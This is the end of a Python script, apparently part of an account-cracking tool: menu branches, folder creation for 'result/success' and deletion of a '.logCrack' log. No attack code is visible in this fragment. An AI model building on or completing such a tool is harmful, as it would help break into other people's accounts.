			cik2=mark(wel ,style='yellow')
			sol().print(cik2)
			exit()
		elif c in ('3','03'):
			self.cek_hasil()
		elif c in ('0','00'):
			self.Exit()
		else:
			self.menu()


if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('mkdir result/success')
	except:pass
	try:os.remove('.logCrack')
	except:pass
	Main_()